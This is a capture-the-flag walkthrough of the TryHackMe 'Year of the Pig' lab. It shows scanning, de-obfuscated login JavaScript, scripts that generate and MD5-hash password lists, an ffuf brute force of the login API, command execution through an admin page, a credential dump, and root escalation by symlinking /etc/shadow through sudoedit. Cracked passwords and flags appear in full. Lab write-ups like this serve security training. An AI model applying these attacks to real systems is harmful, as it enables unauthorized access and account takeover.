CTF URL:https://tryhackme.com/r/room/yearofthepig
# IP
```
10.10.142.177
```
# Reconaisance
## NMAP
```bash
nmap -p- -T4 10.10.142.177 -v
nmap -p22,80 -sS -sC -sV 10.10.142.177 -v
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 9899F13BCC614EE8275B88FFDC0D04DB
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Marco's Blog
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
## WEB
### Dirb
```bash
dirb http://10.10.142.177/
# result
/api
/admin
/login
```
### Nikto
```bash
nikto -h 10.10.142.177
```
# Recon
## Users
- Marco
## Endpoints
```bash
gobuster dir -u http://10.10.142.177/api/ -m POST -w /usr/share/wordlists/dirb/common.txt

/api
/api/login
/api/logout

curl 'http://10.10.142.177/api/login' -X POST --data-raw '{"username":"a","password":"a"}'


```
## JS code in login
```js
const _0x44d4 = [
    'auth',
    'querySelector',
    'click',
    'replace',
    'post',
    '#submit-btn',
    'input',
    'then',
    'authLogin=',
    'addEventListener',
    'keyCode',
    '#username',
    'style',
    'Success',
    '/admin',
    'keyup',
    'location',
    'Response',
    'cookie',
    'application/json',
    'stringify',
    'same-origin',
    'querySelectorAll',
    'value',
    'opacity:\x201'
];
(function (_0x2a05df, _0x44d43e) {
    const _0x48fdee = function (_0x21eb22) {
        while (--_0x21eb22) {
            _0x2a05df['push'](_0x2a05df['shift']());
        }
    };
    _0x48fdee(++_0x44d43e);
}(_0x44d4, 0x114));
const _0x48fd = function (_0x2a05df, _0x44d43e) {
    _0x2a05df = _0x2a05df - 0x0;
    let _0x48fdee = _0x44d4[_0x2a05df];
    return _0x48fdee;
};
function login() {
    const _0x289586 = document[_0x48fd('0x0')]('#username'),
        _0x56c661 = document[_0x48fd('0x0')]('#password'),
        _0x236a57 = md5(_0x56c661[_0x48fd('0x16')]);
    fetch('/api/login', {
        'method': _0x48fd('0x3'),
        'credentials': _0x48fd('0x14'),
        'headers': {
            'Accept': _0x48fd('0x12')
        },
        'body': JSON[_0x48fd('0x13')]({
            'username': _0x289586[_0x48fd('0x16')],
            'password': _0x236a57
        })
    })[_0x48fd('0x6')](_0x59ed95 => _0x59ed95['json']())['then'](_0x5d33bc => {
        document[_0x48fd('0x0')](_0x48fd('0xa'))['value'] = '',
        document[_0x48fd('0x0')]('#password')[_0x48fd('0x16')] = '',
        _0x5d33bc[_0x48fd('0x10')] == _0x48fd('0xc')
            ? (document[_0x48fd('0x11')] = _0x48fd('0x7') + _0x5d33bc[_0x48fd('0x18')] + ';\x20samesite=lax;\x20path=\x22/\x22', window[_0x48fd('0xf')][_0x48fd('0x2')](_0x48fd('0xd')))
            : (alert(_0x5d33bc['Verbose']), document[_0x48fd('0x0')]('#pass-hint')[_0x48fd('0xb')] = _0x48fd('0x17'));
    });
}
document[_0x48fd('0x15')](_0x48fd('0x5'))['forEach'](_0x47694c => {
    _0x47694c[_0x48fd('0x8')](_0x48fd('0xe'), _0x571e21 => {
        _0x571e21[_0x48fd('0x9')] === 0xd && document[_0x48fd('0x0')](_0x48fd('0x4'))[_0x48fd('0x1')]();
    });
});

```
password should be in md5
## Brute Force with MD5
for md5ing passwords
```bash
#!/bin/bash

# Check if the input file is provided as argument
if [ $# -ne 1 ]; then
    echo "Usage: $0 <input_file>"
    exit 1
fi

input_file=$1

# Check if the input file exists
if [ ! -f "$input_file" ]; then
    echo "Input file not found!"
    exit 1
fi

# Generate MD5 hashed passwords and save to a new file
output_file="md5_passwords.txt"
while IFS= read -r password; do
    md5_password=$(echo -n "$password" | md5sum | cut -d ' ' -f 1)
    echo "$md5_password" >> "$output_file"
done < "$input_file"

echo "MD5 hashed passwords saved to $output_file"
```

```bash
ffuf -u http://10.10.142.177/api/login -X POST -w userlist.txt:W1,md5_passwords.txt:W2 -H "Content-Type: application/json" -d '{"username":"W1","password":"W2"}' -v -o result
```

on website
```
Remember that passwords should be a memorable word, followed by two numbers and a special character

word[0-9][0-9][!@#$%&]

```

for getting correct passwords
```bash
#!/bin/bash

# Check if memowords.txt exists
if [ ! -f "memowords.txt" ]; then
    echo "Error: memowords.txt does not exist."
    exit 1
fi

# Define special characters
special_chars="!?#$%&/()="

# Generate password wordlist
while IFS= read -r word; do
    for i in {0..9}; do
        for j in {0..9}; do
            for char in $(echo "$special_chars" | fold -w1); do
                echo "${word}${i}${j}${char}"
            done
        done
    done
done < "memowords.txt"
```

memorable wordlist
```
Marco
marco
plane
planes
airplane
airplanes
airforce
flying
Savoia
savoia
Macchi
macchi
Curtiss
curtiss
milan
Milan
mechanic
maintenance
Italian
italian
Agility
agility
```



# On Command Page
`marco:savoia21!:ea22b622ba9b3c41b22785dcb40211ac`


```js
const _0x45fe = [
    'readyState',
    '/api/logout',
    '#content',
    'document',
    'authLogin=\x27\x27;path=/;Max-Age=-99999999',
    'innerHTML',
    'remove',
    'then',
    'contentWindow',
    'active-nav-btn',
    'onload',
    'application/json',
    'opacity:\x201;',
    'same-origin',
    'reload',
    'style',
    'add',
    'getElementsByClassName',
    'complete',
    '#id',
    'classList',
    'querySelector',
    'json',
    'opacity:\x200;',
    'post',
    'cookie'
];
(function (_0x37ab5d, _0x45fe2f) {
    const _0x1b24e4 = function (_0x4dfd90) {
        while (--_0x4dfd90) {
            _0x37ab5d['push'](_0x37ab5d['shift']());
        }
    };
    _0x1b24e4(++_0x45fe2f);
}(_0x45fe, 0x14e));
const _0x1b24 = function (_0x37ab5d, _0x45fe2f) {
    _0x37ab5d = _0x37ab5d - 0x0;
    let _0x1b24e4 = _0x45fe[_0x37ab5d];
    return _0x1b24e4;
};
window[_0x1b24('0xe')] = () => {
    const _0x1b777d = document[_0x1b24('0x19')](_0x1b24('0x6')),
        _0x52d583 = _0x1b777d[_0x1b24('0xc')][_0x1b24('0x7')][_0x1b24('0x19')](_0x1b24('0x17'))[_0x1b24('0x9')];
    document[_0x1b24('0x19')]('#' + _0x52d583)[_0x1b24('0x18')][_0x1b24('0x14')](_0x1b24('0xd')),
    _0x1b777d[_0x1b24('0x13')] = 'opacity:\x201';
};
function frameLoad() {
    const _0x2b3c2c = document[_0x1b24('0x19')]('#content');
    if (_0x2b3c2c[_0x1b24('0xc')][_0x1b24('0x7')][_0x1b24('0x4')] == _0x1b24('0x16')) {
        setTimeout(() => {
            _0x2b3c2c['style'] = _0x1b24('0x10');
        }, 0x3e8);
        return;
    }
    window['setTimeout'](frameLoad, 0x64);
};
function changeContent(_0x5babcf, _0x32d458) {
    const _0x5693cd = document[_0x1b24('0x19')](_0x1b24('0x6'));
    _0x5693cd[_0x1b24('0x13')] = _0x1b24('0x1'),
    document[_0x1b24('0x15')](_0x1b24('0xd'))[0x0][_0x1b24('0x18')][_0x1b24('0xa')](_0x1b24('0xd')),
    _0x32d458[_0x1b24('0x18')]['add'](_0x1b24('0xd')),
    setTimeout(() => {
        _0x5693cd['src'] = _0x5babcf;
    }, 0x1f4),
    frameLoad();
};
function logout() {
    fetch(_0x1b24('0x5'), {
        'method': _0x1b24('0x2'),
        'credentials': _0x1b24('0x11'),
        'headers': {
            'Accept': _0x1b24('0xf')
        }
    })['then'](_0x56d65f => _0x56d65f[_0x1b24('0x0')]())[_0x1b24('0xb')](_0x3a959d => {
        document[_0x1b24('0x3')] = _0x1b24('0x8'),
        window['location'][_0x1b24('0x12')]();
    });
}
```

```bash
curl 'http://10.10.142.177/admin/commands.php' -X POST -H 'Cookie: authLogin=a60c3265060d902a6bad91ffdef3b429' --data-raw 'command=whoami&submit=Execute' | grep pre
```

after brute forcing with command list ( from gpt)
```bash
tigervnc
nc
whoami
id
echo
```
it is not working way
# PrivEsc to Curtis
SSH is working with the same creds

## Recon
interesting files
```bash
find / -group web-developers  2>/dev/null | more
# Result
/var/www/admin.db
```
#### Linpeas
```
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                      
Sudoers file: /etc/sudoers.d/curtis is readable                                                                                                                       
curtis ALL=(ALL:ALL) sudoedit /var/www/html/*/*/config.php
```
### Admin.db
```php
<?php

// Database file path
$db_file = '/var/www/admin.db';

// Connect to SQLite database
try {
    $db = new SQLite3($db_file);
} catch (Exception $e) {
    die("Error: Unable to connect to the database.");
}

// Get list of tables in the database
$tables_result = $db->query("SELECT name FROM sqlite_master WHERE type='table'");
$tables = [];
while ($table = $tables_result->fetchArray(SQLITE3_ASSOC)) {
    $tables[] = $table['name'];
}

// Display data for each table
foreach ($tables as $table) {
    echo "<h2>Table: $table</h2>";
    $table_result = $db->query("SELECT * FROM $table");
    echo "<table border='1'><tr>";
    // Display column headers
    $column_names = [];
    for ($i = 0; $i < $table_result->numColumns(); $i++) {
        $column_names[] = $table_result->columnName($i);
        echo "<th>" . $table_result->columnName($i) . "</th>";
    }
    echo "</tr>";
    // Display table rows
    while ($row = $table_result->fetchArray(SQLITE3_ASSOC)) {
        echo "<tr>";
        foreach ($column_names as $column) {
            echo "<td>" . $row[$column] . "</td>";
        }
        echo "</tr>";
    }
    echo "</table>";
}

// Close database connection
$db->close();

?>

```

```
Table: users
userID	username	password
58a2f366b1fd51e127a47da03afc9995	marco	ea22b622ba9b3c41b22785dcb40211ac
f64ccfff6f64d57b121a85f9385cf256	curtis	a80bfe309ecaafcea1ea6cb3677971f2
```
`curtis:a80bfe309ecaafcea1ea6cb3677971f2:Donald1983$`
`THM{Y2Q2N2M1NzNmYTQzYTI4ODliYzkzMmZh}`
# Priv Esc to root
```bash
curtis@year-of-the-pig:/home/marco$ sudo -l
Matching Defaults entries for curtis on year-of-the-pig:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH"

User curtis may run the following commands on year-of-the-pig:
    (ALL : ALL) sudoedit /var/www/html/*/*/config.php

```

```bash
ln -s /etc/shadow /var/www/html/*/*/config.php # as marco
sudoedit /var/www/html/*/*/config.php # change password of root
```

```
THM{MjcxNmVmYjNhYzdkZDc0M2RkNTZhNDA0}
```